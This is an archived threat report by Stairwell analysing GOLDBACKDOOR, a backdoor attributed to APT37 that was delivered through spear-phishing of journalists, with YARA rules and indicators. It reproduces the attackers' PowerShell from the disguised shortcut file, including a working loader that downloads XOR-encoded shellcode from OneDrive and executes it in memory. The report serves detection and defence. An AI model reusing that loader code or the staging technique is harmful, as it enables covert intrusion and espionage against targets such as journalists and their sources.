{
    "id": "ff9e75e8-408c-49e8-b54c-73da697f59ca",
    "created_at": "2022-10-25T16:48:22.175163Z",
    "updated_at": "2025-03-27T02:16:37.056863Z",
    "deleted_at": null,
    "sha1_hash": "095c763cb66c58a7f61e97b0dcd7328ae0a51d59",
    "title": "The ink-stained trail of GOLDBACKDOOR",
    "authors": "stairwell",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 416628,
    "plain_text": "# The ink-stained trail of GOLDBACKDOOR\n\n##### Threat report\n\n Silas Cutler, Principal Reverse Engineer 21/04/2022\n\n\n-----\n\n###### Threat report\n\n\n# Table of contents\n\n**GOLDBACKDOOR deployment** **3**\n\nStage 1 4\n\nKang Min-chol Edits 2.zip 4\n\nKang Min-chol Edits 2.lnk 5\n\nStage 2 8\n\n\nFantasy injector 8\n\nFinal dropper 9\n\nGOLDBACKDOOR 9\n\n**Tracking document** **10**\n\n\n**Conclusion** **11**\n\n**Appendix** **12**\n\nYARA rules 12\n\nInfrastructure 15\n\nFiles 15\n\n###### 2\n\n\n-----\n\n###### Threat report\n\n\nOver the past 10 years, the Democratic People's Republic of Korea (DPRK) has adopted cyber\noperations as a key means of supporting the regime. While significant attention has been paid to the\npurported use of these operations as a means of funding DPRK’s military programs, the targeting of\nresearchers, dissidents, and journalists likely remains a key area for supporting the country's\nintelligence operations.\n\nJournalists are high-value targets for hostile governments. They often are aggregators of stories from\nmany individuals – sometimes including those with sensitive access. Compromising a journalist can\nprovide access to highly-sensitive information and enable additional attacks against their sources.\n\nOn 18 March 2022, NK News shared multiple malicious artifacts with the Stairwell threat research team\nfrom a spear-phishing campaign targeting journalists who specialize in the DPRK. These messages were\nsent from the personal email of a former director of South Korea’s National Intelligence Service (NIS).\nOne of these artifacts was a new malware sample we have named GOLDBACKDOOR, based on an\nembedded development artifact.\n\nStairwell assesses with medium-high confidence that GOLDBACKDOOR is the successor of, or used in\nparallel with, the malware BLUELIGHT, attributed to APT37 / Ricochet Chollima. This assessment is\nbased on technical overlaps between the two malware families and the impersonation of NK News, a\nSouth Korean news site focused on the DPRK.\n\nNK News has published an [article detailing the incident and this report will outline the technical process](https://www.nknews.org/2022/04/north-korean-hackers-steal-ex-intelligence-officials-emails-in-malware-attack/)\nin which GOLDBACKDOOR is deployed on infected systems.\n\n\n###### 3\n\n\n-----\n\n###### Threat report\n\n\n## GOLDBACKDOOR deployment\n\nDeployment of GOLDBACKDOOR is a multi-stage process, likely designed to avoid detection by\nantivirus or endpoint security. This process can be logically subdivided into two major components,\neach with two subsections. A high-level overview of the deployment process is shown below:\n\nBy separating the first stage tooling and the final payload, the actor retains the ability to halt\ndeployment after initial targets are infected. Additionally, this design may limit the ability to conduct\nretrospective analysis once payloads are removed from control infrastructure.\n\n#### Stage 1\n\n###### Kang Min-chol Edits 2.zip\n\nThe deployment chain for GOLDBACKDOOR in this incident was predicated on a user downloading a ZIP\nfile from https[:]//main[.]dailynk[.]us/regex?id=oTks2&file=Kang Min-chol Edits\n```\n2.zip and executing a compressed Windows shortcut. The domain dailynk[.]us was likely chosen to\n\n```\nimpersonate NK News (dailynk[.]com), previously used by APT37 as a strategic web compromise\n\n(SWC) using CVE-2020-1380 and CVE-2021-26411. At the time of initial analysis, the domain\n\n###### 4\n\n\n-----\n\n###### Threat report\n\n\nmail[.]dailynk[.]us had stopped resolving; however, from historic DNS resolutions, we were able to\nidentify 142.93.201[.]77 as the last address this domain resolved and were able to retrieve the ZIP\n\nfile.\n\nThis ZIP file (SHA256 hash:\n```\n9eddd99db6f5a7791f7e446792f04b301d29f6b0596920e8b39647cc7585185d) was named Kang\nMin-chol Edits 2.zip and contains a single Windows shortcut file. Timestamps in the ZIP file show\n\n```\nthat the contained file was added on 17 March 2022 at 16:51 UTC.\n\n###### Kang Min-chol Edits 2.lnk\n\nContained within the initial ZIP archive was a 282.7 MB Windows shortcut file (LNK) named Kang\n```\nMin-chol Edits 2.lnk (SHA256 hash:\n120ca851663ef0ebef585d716c9e2ba67bd4870865160fec3b853156be1159c5). The attackers\n\n```\nmasqueraded this shortcut as a document, using both the icon for Microsoft Word and adding\ncomments similar to a Word document. Additionally, this LNK file was padded with 0x90 (or NOP/No\n\nOperation) bytes to artificially increase the size of this file, potentially as a means of preventing upload\nto detection services or malware repositories.\n\nWhen this LNK file is executed, it executes a PowerShell script that writes and opens a decoy document\nbefore starting the deployment process of GOLDBACKDOOR. A formatted version the PowerShell\ncommand and executed script are shown below:\n\n```\n%windir%\\SysWOW64\\cmd.exe /c powershell -windowstyle hidden\n$dirPath = Get-Location;\nif($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {\n  $dirPath = '%temp%'\n};\n$lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {\n  $_.length -eq 0x0010D98A06\n} ^| Select-Object -ExpandProperty FullName;\n$pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00547552 -ReadCount 00547552;\n$pdfPath = '%temp%\\Kang Min-chol Edits 2.doc';\nsc $pdfPath ([byte[]]($pdfFile ^| select -Skip 009440)) -Encoding Byte; ^& $pdfPath;\n$won11 =\"$temple=\"\"\"5B4E...(Removed for readability)...293B\"\"\";\n  $martin=\"\"\"\"\"\";\n  for($i=0;$i -le $temple.Length-2;$i=$i+2){\n     $Sorre=$temple[$i]+$temple[$i+1];\n     $martin= $martin+[char]([convert]::toint16($Sorre,16));\n  };\n  Invoke-Command -ScriptBlock ([Scriptblock]::Create($martin));\";\nInvoke-Command -ScriptBlock ([Scriptblock]::Create($won11));\n\n```\n\n###### 5\n\n\n-----\n\n###### Threat report\n\n\nThe decoy document (SHA256 hash:\n```\n94ca32c0a3002574d7ea1bef094146a9d3b2ad0018b3e3d3f4ffca8689b89e5a) dropped by this LNK\n\n```\nfile is embedded at file offset 0x24E0 (9440) and written to %temp%\\Kang Min-chol Edits 2.doc,\n\nbefore being opened. The following screenshot shows the opened document after a user runs the\nshortcut. To a user executing the LNK file, believing it was a legitimate document, the only indication\nthat something suspicious was underway may have been a short delay while the document was\nextracted and written to disk.\n\nScreenshot of decoy document\n\nAfter deploying the decoy document, the PowerShell script decodes a second PowerShell script,\nhex-encoded in the $temple variable, which it executes using Invoke-Command. A decoded and\n\nformatted version of the second PowerShell script is shown below:\n\n###### 6\n\n\n-----\n\n###### Threat report\n\n```\n[Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType], 3072);\n$aa='[DllImport(\"kernel32.dll\")]public static extern IntPtr GlobalAlloc(uint b,uint c);’;\n$b=Add-Type -MemberDefinition $aa -Name \"AAA\" -PassThru;\n$abab = '[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr a,uint b,uint\nc,out IntPtr d);';\n$aab=Add-Type -MemberDefinition $abab -Name \"AAB\" -PassThru;\n$c = New-Object System.Net.WebClient;\n$d=\"hxxps://api[.]onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBcjl6ZnJ3eFdXRW9hczVYaV\nc5TWUxNGlhQnM_ZT0wZVdDcTc/root/content\";\n$bb='[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr\nc,IntPtr d,uint e,IntPtr f);';\n$ccc=Add-Type -MemberDefinition $bb -Name \"BBB\" -PassThru;\n$ddd='[DllImport(\"kernel32.dll\")]public static extern IntPtr WaitForSingleObject(IntPtr a,uint\nb);';\n$fff=Add-Type -MemberDefinition $ddd -Name \"DDD\" -PassThru;\n$e=112;\ndo {\n try {\n  $c.Headers[\"user-agent\"] = \"connnecting...\";\n  $xmpw4=$c.DownloadData($d);\n  $x0 = $b::GlobalAlloc(0x0040, $xmpw4.Length+0x100);\n  $old = 0;\n  $aab::VirtualProtect($x0, $xmpw4.Length+0x100, 0x40, [ref]$old);\n  for ($h = 1; $h -lt $xmpw4.Length; $h++) {\n    [System.Runtime.InteropServices.Marshal]::WriteByte($x0, $h-1, ($xmpw4[$h] -bxor\n$xmpw4[0]) );\n  };\n  try{throw 1;}\n  catch{\n   $handle=$ccc::CreateThread(0,0,$x0,0,0,0);\n   $fff::WaitForSingleObject($handle, 500*1000);\n  };\n $e=222;\n }\n catch{\n  sleep 11;\n  $e=112;\n }\n} while($e -eq 112);\n\n```\n\nWhen executed, this second PowerShell script will download and execute a shellcode payload (XOR\nencoded using the first-byte as a key) stored on Microsoft OneDrive. When manually downloaded\nduring analysis, this payload was named Fantasy.\n\n###### 7\n\n\n-----\n\n###### Threat report\n\n\n#### Stage 2\n\n###### Fantasy injector\n\nFantasy is the first of a two-part process for deploying GOLDBACKDOOR. Both parts are written in\nposition-independent code (shellcode) containing an embedded payload, and use process injection to\ndeploy GOLDBACKDOOR.\n\nShellcode typically resolves external Windows API calls at runtime. Fantasy uses a common technique\nfor this, which involves parsing the InLoadOrderModuleList structure of the Process Environment\n\nBlock (PEB) of the parent process to generate a list of libraries already loaded. When Fantasy needs to\nuse one of these API calls, it passes a hashed value of the intended API call to a dedicated function that\nreturns the corresponding address. This function hashes loaded Windows API names and libraries until\nit matches the requested hash. A pseudocode implementation of this hashing is shown below:\n\n```\ndef resolve_import(apiName, dllFilename):\n  # Ex:\n  # apiName = VirtualAlloc\n  # dllFilename: unicode(kernel32.dll)\n  # Return: 0xAA7ADB76\n  dllHash = 0\n  nameHash = 0\n  for c in dllFilename:\n     dllHash = ror(dllHash, 11, 32)\n     if ord(c) >= 97:\n       dllHash -= 32\n     dllHash = ord(c) + dllHash\n  for i in apiName:\n     nameHash = ror(nameHash, 15, 32) + i\n  nameHash = (nameHash ^ dllHash)\n  return nameHash\n\n```\n\nUpon execution, Fantasy parses files under %WINDIR%\\System32 until one is found that ends in .exe\n\nthat Fantasy has read access. The full path to the identified executable file is written to\n```\n%localappdata%\\\\log_gold.txt, possibly for debugging purposes, before being started in a\n\n```\nsuspended state using CreateProcessA and passing the CREATE_SUSPENDED flag.\n\nOnce a suspended process has been created, Fantasy will decode a shellcode payload, which will be\ninjected into the newly created process. The injected payload is stored at offset 0x672 and obfuscated\n\nusing a single byte eXclusive OR (XOR) cipher. The size and XOR key for this payload are structured\n\n\n###### 8\n\n\n-----\n\n###### Threat report\n\n\nusing a distinctive format to avoid statically defining values in the shellcode. A representation of this\nstructure is shown below:\n\n```\n00000000 23 fa 53 10 00 a0 cf 3f ae 67 07 2f 9a 68 34 ee |#úS.. Ï?®g./.h4î|\n00000010 78 76 75 10 ce 76 49 33 73 cb a5 23 23 23 dc f3 |xvu.ÎvI3sË¥###Üó|\n...\n23       – XOR key\nfa 53 10 00   - Payload size\na0 cf 3f ae... - Encoded payload data\n\n```\n\nAfter this payload is decoded, Fantasy uses a standard process involving VirtualAllocEx,\n```\nWriteProcessMemory, and RtlCreateUserThread to spawn a thread under the previously created\n\n```\nprocess for execution of this payload.\n\n###### Final dropper\n\nThe shellcode payload, running as a thread in a process created by Fantasy, is responsible for the final\ndeployment of GOLDBACKDOOR. Fundamentally, this component is close in design and functionality to\nits parent shellcode loader; it uses the same method for API resolution, payload structure, and writes a\nlog file to %localappdata%\\\\log_gold2.txt.\n\nThe payload delivered by this stage is a Windows Portable Executable (PE) file for GOLDBACKDOOR. As\nwith the previous shellcode payload, the first byte is used as an XOR key and the proceeding DWORD\ndefines the size of the encoded payload. After decoding, the PE header of the payload is parsed for its\nrespective EntryPoint[1], which is then called to begin the execution of GOLDBACKDOOR.\n\n#### GOLDBACKDOOR\n\nThe identified copy of GOLDBACKDOOR is a Windows Portable Executable (PE) file with a build\ntimestamp of 9 February 2022 02:38:30 UTC and contains a Program Database (PDB) path reference to\n```\nD:\\Development\\GOLD-BACKDOOR\\Release\\FirstBackdoor.pdb, from which was named.\n\n```\nIn contrast with the timestamps of files in the ZIP file, which were added within hours of being sent to\ntargets, this executable was created over a month prior, potentially indicating the final payload is not\ncustomized on a per-target basis. While it is unclear from this sample alone if individual operators have\nthe ability to generate on-demand unique copies of GOLDBACKDOOR, these types of time deltas can\nsometimes be reflective of actor groups composed of separated operational and development teams.\n\n1\nhttps://docs.microsoft.com/en-us/windows/win32/debug/pe-format\n\n###### 9\n\n\n-----\n\n###### Threat report\n\n\nDuring Stairwell’s analysis of this malware, the identified PDB path in GOLDBACKDOOR led to the initial\nlinking of this malware to a copy of BLUELIGHT, reported by Volexity[2] in August 2021, containing a PDB\npath of E:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb. Based on corresponding build\n\npaths, it’s likely both malware families were created by a common development resource.\n\nGOLDBACKDOOR utilizes cloud service providers for receiving actor commands and exfiltrating data.\nThe sample analyzed as part of this investigation used Microsoft OneDrive and Graph APIs, while an\nadditional identified sample (SHA256 hash:\n```\n485246b411ef5ea9e903397a5490d106946a8323aaf79e6041bdf94763a0c028) used Google Drive.\n\n```\nEmbedded in the analyzed copy of GOLDBACKDOOR are a set of API keys used to authenticate against\nAzure and retrieve commands for execution. Received commands are prefixed with a single-character\nvalue, which denotes the corresponding task requested of the malware.\n\nGOLDBACKDOOR provides attackers with basic remote command execution, file\ndownloading/uploading, keylogging, and the ability to remotely uninstall. This functionality and\nimplementation closely match BLUELIGHT; however, the increased focus appears to have been placed\non file collection and keylogging. A list of file extensions checked for by this malware are listed below:\n\n```\njpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rft, nxl, amr, 3gp, m4a, txt, msg,\nkey, der, cer, docx, xlsx, pptx, pfx, mp3, inf, jog, bin\n\n```\n\n## Tracking document\n\nWhile analyzing the deployment chain of GOLDBACKDOOR, NK News provided a second file (SHA256\nhash: c5369c2ce7f33d6cd209cd61226a0637adc809b864deb73a98d78bfed0883163) that was sent\n\nby the attackers and initially staged on Microsoft OneDrive. Contained in this ZIP file was a single\nMicrosoft Word document named Kang Min-chol Edits 2.doc (SHA256 hash:\n```\n18c9fd4f781789cd15cee4fcb18fa983897fc9876422d662a2243ff7499f5948), consistent with the\n\n```\nfile names from the initial phishing attempt.\n\nThe content of this document matches that of the decoy document deployed by the LNK file in the\nprevious phishing attempt, with one critical addition. Embedded in the document is a reference to an\nexternal image hosted on the cloud application platform Heroku. When viewed in Microsoft Word, if this\nlink returns an image, it will be presented as part of the document; otherwise, it may go unnoticed by a\nuser. When the document is viewed using the GNU strings tool, the embedded link is easily seen:\n\n2\nhttps://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/\n\n###### 10\n\n\n-----\n\n###### Threat report\n\n\n_Embedded link in tracking document_\n\nBased on the URL path and value in the id field corresponding to the document’s name, it is likely this\n\nwas included to give the attacker visibility into when and where the document was opened. This type of\noperational security tradecraft is generally consistent with sophisticated threat actors with mature\noffensive programs.\n\n## Conclusion\n\nTracking cyber threats is an iterative process, and no incident provides us with a complete view into\nevery aspect of a threat actor's history. However, every incident affords us the opportunity to learn\nsomething new. Over time, we develop an understanding of the range of an actor's capabilities,\nobjectives, and tradecraft.\n\nBased on the presented analysis, the GOLDBACKDOOR malware shares strong technical overlaps with\nthe BLUELIGHT malware. These overlaps, along with the suspected shared development resource and\nimpersonation of NK News, support our attribution of GOLDBACKDOOR to APT37.\n\nStairwell would like to thank NK News for the opportunity to assist in this investigation, the SentinelOne\nresearch team for their support, and Volexity for their outstanding prior research into this actor.\n\n\n###### 11\n\n\n-----\n\n###### Threat report\n\n\n## Appendix\n\n#### YARA rules\n\nStairwell's Inception users already have access to these rules automatically.\n\n```\nrule NK_GOLDBACKDOOR_LNK\n{\n  meta:\n     author= \"Silas Cutler (silas@Stairwell.com)\"\n     description = \"Detection for LNK file used to deploy GOLDBACKDOOR\"\n     version = \"0.1\"\n  strings:\n     $ = \"WINWORD.exe\" wide nocase\n     $ = \"$won11 =\\\"$temple=\" wide\n     $ = \"dirPath -Match 'System32' -or $dirPath -Match 'Program Files'\" wide\n  condition:\n     2 of them and uint16(0) == 0x4c\n}\nrule NK_GOLDBACKDOOR_LNK_payload\n{\n  meta:\n     author= \"Silas Cutler (silas@Stairwell.com)\"\n     description = \"Detection for obfuscated Powershell contained in LNK file that deploys\nGOLDBACKDOOR\"\n     version = \"0.1\"\n  strings:\n     $ = \"WriteByte($x0, $h-1, ($xmpw4[$h] -bxor $xmpw4[0]\" ascii wide nocase\n  condition:\n     all of them\n}\nrule NK_GOLDBACKDOOR_obf_payload\n{\n  meta:\n     author= \"Silas Cutler (silas@Stairwell.com)\"\n     description = \"Detection for encoded shellcode payload downloaded by LNK file that drops\nGOLDBACKDOOR\"\n     version = \"0.1\"\n  strings:\n     $init = { e6b3 6d0a 6502 1e67 0aee e7e6 e66b eac2 }\n  condition:\n\n```\n\n###### 12\n\n\n-----\n\n###### Threat report\n\n```\n     $init at 0\n}\nrule NK_GOLDBACKDOOR_inital_shellcode\n{\n  meta:\n     author= \"Silas Cutler (silas@Stairwell.com)\"\n     description = \"Detection for initial shellcode loader used to deploy GOLDBACDOOR\"\n     version = \"0.1\"\n  strings:\n     //seg000:07600058 8D 85 70 FE FF FF            lea   eax, [ebp+var_190]\n     //seg000:0760005E C7 45 C4 25 6C 6F 63          mov   dword ptr [ebp+var_3C],\n'col%'\n     //seg000:07600065 50                   push  eax\n     //...\n     //seg000:0760008F C7 45 D8 6F 6C 64 2E          mov   dword ptr\n[ebp+var_3C+14h], '.dlo'\n     //seg000:07600096 C7 45 DC 74 78 74 00          mov   dword ptr\n[ebp+var_3C+18h], 'txt'\n     $ = { C7 45 C4 25 6C 6F 63 50 8D 45 C4 C7 45 C8 61 6C 61 70 8B F9 C7 45\n       CC 70 64 61 74 50 B9 BD 88 17 75 C7 45 D0 61 25 5C 6C 8B DA C7 45 D4 6F\n       67 5F 67 C7 45 D8 6F 6C 64 2E C7 45 DC 74 78 74 00 }\n     // Import loaders\n     $ = { 51 50 57 56 B9 E6 8E 85 35 E8 ?? ?? ?? ?? FF D0 }\n     $ = { 6A 40 68 00 10 00 00 52 6A 00 FF 75 E0 B9 E3 18 90 72 E8 ?? ?? ?? ?? FF D0}\n  condition:\n     all of them\n}\nrule NK_GOLDBACKDOOR_injected_shellcode\n{\n  meta:\n     author= \"Silas Cutler (silas@Stairwell.com)\"\n     description = \"Detection for injected shellcode that decodes GOLDBACKDOOR\"\n     version = \"0.1\"\n  strings:\n     $dec_routine = { 8A 19 57 8B FA 8B 51 01 83 C1 05 85 D2 74 0E 56 8B C1 8B F2 30 18 40 83\nEE 01 75 F8 5E 57 }\n     $rtlfillmemory_load = {B9 4B 17 CD 5B 55 56 33 ED 55 6A 10 50 E8 86 00 00 00 FF D0}\n     $ = \"StartModule\"\n     $log_file_name = {C7 44 24 3C 25 6C 6F 63 50 8D 44 24 40 C7 44 24 44 61 6C 61 70 50 B9 BD\n88 17 75 C7 44 24 4C 70 64 61\n        74 C7 44 24 50 61 25 5C 6C C7 44 24 54 6F 67 5F 67 C7 44 24 58 6F 6C 64 32 C7 44 24\n5C 2E 74 78 74}\n\n```\n\n###### 13\n\n\n-----\n\n###### Threat report\n\n```\n     $ = { B9 8E 8A DD 8D 8B F0 E8 E9 FB FF FF FF D0 }\n  condition:\n     3 of them\n}\nrule NK_GOLDBACKDOOR_generic_shellcode\n{\n  meta:\n     author= \"Silas Cutler (silas@Stairwell.com)\"\n     description = \"Generic detection for shellcode used to drop GOLDBACKDOOR\"\n     version = \"0.1\"\n  strings:\n     $ = { B9 8E 8A DD 8D 8B F0 E8 ?? ?? ?? ?? FF D0 }\n     $ = { B9 8E AB 6F 40 [1-10] 50 [1-10] E8 ?? ?? ?? ?? FF D0 }\n  condition:\n     all of them\n}\nrule NK_GOLDBACKDOOR_Main\n{\n  meta:\n     author= \"Silas Cutler\"\n     description = \"Detection for Main component of GOLDBACKDOOR\"\n     version = \"0.1\"\n  strings:\n     $str1 = \"could not exec bash command.\" wide\n     $str2 = \"%userprofile%\\\\AppData\" wide\n     $str3 = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/90.0.3112.113 Safari/537.36\" wide\n     $str4 = \"tickount: %d\"\n     $str5 = \"Service-0x\" wide\n     $str6 = \"Main Returned\"\n     $b64_1 = \"TwBuAGUARAByAHYAVQBwAGQAYQB0AGUAAAA=\"\n     $b64_2 = \"aGFnZW50dHJheQ==\"\n     $b64_3 = \"YXBwbGljYXRpb24vdm5kLmdvb2dsZS1hcHBzLmZvbGRlcg==\"\n     $pdb = \"D:\\\\Development\\\\GOLD-BACKDOOR\\\\\"\n  condition:\n     4 of them or ( $pdb and 1 of them )\n}\n\n```\n\n###### 14\n\n\n-----\n\n###### Threat report\n\n\n#### Infrastructure\n\n**Indicator**\n\nmain[.]dailynk[.]us\n\n142.93.201[.]77\n\n#### Files\n\n|Indicator|Type|Date Active|Description|\n|---|---|---|---|\n|main[.]dailynk[.]us|Domain|March 2022|Domain used for staging malicious document|\n|142.93.201[.]77|IP address|March 2022|IP address main[.]dailynk[.]us resolved to at the time of the incident|\n\n|File Name|File Type|Size|SHA256 Hash|\n|---|---|---|---|\n|Kang Min-chol Edits 2.zip|Zip archive file|487K|9eddd99db6f5a7791f7e446792f04b301d 29f6b0596920e8b39647cc7585185d|\n|Kang Min-chol Edits 2.lnk|Windows shortcut file|282.7M|120ca851663ef0ebef585d716c9e2ba67b d4870865160fec3b853156be1159c5|\n|Kang Min-chol Edits 2.doc|Microsoft Office Document|526K|94ca32c0a3002574d7ea1bef094146a9d 3b2ad0018b3e3d3f4ffca8689b89e5a|\n|Fantasy|Binary Data|1.1M|45ece107409194f5f1ec2fbd902d041f055 a914e664f8ed2aa1f90e223339039|\n|N/A (GOLDBACKDOOR)|Binary Data|1.1M|c02d0f7bc47bfd46bf88cad0648b24118c a77675c77595b68c0da9d91208b1de|\n|Kang Min-chol Edits 2.zip (Tracking Document zip)|Zip archive file|187K|c5369c2ce7f33d6cd209cd61226a0637a dc809b864deb73a98d78bfed0883163|\n|Kang Min-chol Edits 2.doc (Tracking Document)|Microsoft Office Document|525K|18c9fd4f781789cd15cee4fcb18fa983897 fc9876422d662a2243ff7499f5948|\n|N/A|Windows portable executable|1.2M|485246b411ef5ea9e903397a5490d1069 46a8323aaf79e6041bdf94763a0c028|\n\n\n###### 15\n\n\n-----\n\n###### Threat report\n\n\nFor more information on the intelligence provided in this report,\n\ncontact us at [research@stairwell.com](mailto:research@stairwell.com)\n\nStairwell helps organizations take back the cybersecurity high ground with solutions that attackers can't evade. Its flagship\nproduct, the Inception platform, empowers security teams to outsmart any attacker. Stairwell is composed of security industry\nleaders and engineers from Google and is backed by Sequoia Capital, Accel, and Gradient Ventures. [stairwell.com](http://stairwell.com)\n\n###### 16\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/q8cy0c5l8wpddfq60i4dccc2wucqsasf",
        "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
    ],
    "report_names": [
        "Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR(04-21-2022)",
        "Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
    ],
    "threat_actors": [
        {
            "id": "77b28afd-8187-4917-a453-1d5a279cb5e4",
            "created_at": "2022-10-25T15:50:23.768278Z",
            "updated_at": "2025-03-27T02:00:55.5423Z",
            "deleted_at": null,
            "main_name": "Inception",
            "aliases": [
                "Inception Framework",
                "Cloud Atlas"
            ],
            "source_name": "MITRE:Inception",
            "tools": [
                "PowerShower",
                "VBShower",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/095c763cb66c58a7f61e97b0dcd7328ae0a51d59.pdf",
        "text": "https://archive.orkl.eu/095c763cb66c58a7f61e97b0dcd7328ae0a51d59.txt",
        "img": "https://archive.orkl.eu/095c763cb66c58a7f61e97b0dcd7328ae0a51d59.jpg"
    }
}